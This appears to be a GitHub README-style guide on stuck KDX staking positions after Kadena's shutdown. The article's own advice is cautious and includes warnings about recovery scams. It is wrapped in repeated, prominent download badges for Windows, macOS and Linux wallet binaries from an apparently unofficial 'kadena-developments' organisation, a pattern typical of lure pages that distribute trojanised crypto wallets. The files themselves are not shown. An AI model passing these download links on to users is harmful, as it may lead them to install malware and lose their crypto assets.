![Kadena Wallet](assets/banner-article.png)

<h1 align="center">KDX Staking After the Shutdown: What Still Works</h1>

<p align="center">A Kadena Wallet guide to the network and the market.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Staking a token that belongs to a programme is a different kind of exposure from holding a native balance. The balance depends on the chain continuing. The staked position depends on a contract, an operator and a programme that has to keep being maintained. When the company behind a network stops operating, the first survives and the second becomes a question nobody is answering.

That is the situation with KDX positions, and the honest answer is narrower than most pages will give you.

## You'll see this if

- You staked or bonded KDX and cannot withdraw.
- You are trying to work out whether the position still exists on-chain.
- You have been told a migration or compensation is coming and want to check it.
- You are deciding whether to spend more time or money chasing the position.

## What is actually known

Three things can be stated with a source, and everything else should be treated as unverified.

**The programme existed and involved locking.** Community threads from 2023 and 2024 discuss staking and bonding arrangements, including a proposal to change bonding multipliers. People locked tokens against those arrangements, which is why withdrawal questions appear at all.

**Withdrawals failed for some holders.** A thread from July 2024 titled "Cannot unstake my kdx token" is the clearest public report, and it produced no resolution in the thread.

**No operator statement resolves it.** No announcement from the company or from the community edition was found that addresses outstanding KDX positions, compensates them, or declares them void.

That is the whole evidentiary base. It is enough to describe the problem and not enough to promise an outcome.

## Why a staked position is fragile

The distinction that matters is between an asset and a claim.

| | Native balance | Staked position |
| --- | --- | --- |
| Where it lives | Your account, on-chain | A contract's state, governed by rules |
| What you need to move it | Your key | The contract's withdrawal path |
| Who can change the rules | Nobody | Whoever controls the contract |
| What happens if maintenance stops | Nothing changes | The withdrawal path may stop working |

Your key still controls your account. It does not control a contract that holds your tokens, and no amount of key custody substitutes for a withdrawal function that no longer responds.

That is why "not your keys, not your coins" is an incomplete slogan. Keys are necessary and not sufficient: the contract between your key and the asset has to work too.

## Establishing what you actually have

Before spending anything on the problem, find out what state the position is in.

1. **Open the account on an explorer** and read the token holdings. A balance in the account is different from a balance locked in a contract.
2. **Find the contract or module** the position was created against, and check whether it still responds to reads.
3. **Look for the position record itself.** If the contract exposes per-holder state, that record tells you whether the lock still exists and under what conditions.
4. **Write down the transaction hashes** from the original stake, and from any withdrawal attempt.
5. **Record the dates.** A timeline is the only thing that makes a support request legible years later.

Steps three and four are what separate a claim you can describe from a feeling that something was lost.

## What can still be done

- **Read the contract.** If a withdrawal function exists and responds, a compatible interface may be able to call it. That is a technical route, and it requires knowing the contract rather than trusting a website.
- **Ask in the community channels where the programme was discussed.** Not because they can unlock anything, but because other holders may have found a working path, and a shared record is better than a private hope.
- **Keep the evidence.** Hashes, dates, amounts and any correspondence. If a resolution ever appears, the holders who can prove their position are the ones who get included.

None of those is a promise. All three are what remains when the operator is gone.

## What cannot be done

- **No recovery service can unlock a contract position.** Anyone claiming otherwise is describing either a technical route they should be able to explain, or a fraud.
- **No key recovery helps.** The tokens are not missing from your account; they are subject to a rule you cannot override.
- **No amount of holding creates a claim on the community edition.** It maintains nodes and governance keysets, and it inherited no obligation to a token programme.
- **No fork solves it.** A chain fork preserves state. If the state says locked, a fork preserves locked.

That last point is worth sitting with, because "the chain forked" is often offered as reassurance. A fork copies the ledger, including the parts you wish were different.

## Deciding whether to keep chasing it

Three questions, answered honestly, decide this.

1. **Is there a live withdrawal path?** If a contract read returns a usable function, there is a technical route worth one attempt. If nothing responds, there is not.
2. **Is the position material to you?** Time spent is a cost, and a position worth a few dollars does not justify months of chasing.
3. **Is anyone credible working on it?** A named person with a repository and a commit history is different from an anonymous account promising a fix.

If the answers are no, no and nobody, the position is a documented loss rather than an open project. Documenting it is not giving up; it is closing the file so it stops costing attention.

## What this says about token programmes generally

The KDX case is a small, specific illustration of a general rule: a token issued by a company inherits the company's fate in a way a native asset does not. The chain can outlive its operator. A programme usually cannot, because a programme needs someone to keep running it.

That is worth remembering the next time a yield arrangement is described as passive. The passivity is in the income, not in the risk.

## FAQ

**Is my KDX gone?**
Unknown, and that is the accurate answer. Check whether the position record still exists and whether the contract responds before concluding either way.

**Can I move staked KDX with my recovery phrase?**
No. The phrase controls your account. A locked position is governed by the contract's rules, not by key custody.

**Did the community edition take over KDX?**
Nothing found suggests it did. It maintains the network and its governance keysets, not token programmes.

**Should I pay someone to unlock it?**
No. Ask any such offer to explain the technical route before payment, and expect that explanation not to exist.

**Will a future upgrade fix it?**
An upgrade can change protocol rules. It cannot rewrite a contract's state or restore an operator that stopped operating.

## Related reading

- KDA and KDX are not the same token: what each one is
- Community Edition of Kadena, explained
- What happened to Kadena: the fourteen months that changed everything
- Avoid KDA recovery scams: how to spot them in Kadena Wallet support

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Bridges to and from Kadena: What Exists and What It Costs You](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/kadena-bridge-options-and-risk.md)
- [Best Kadena Wallet in 2026: Every Option That Still Works](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/best-kadena-wallet-in-2026.md)
- [Zelcore vs Kadena Wallet: Multi-Asset Against Kadena-First](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/zelcore-vs-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
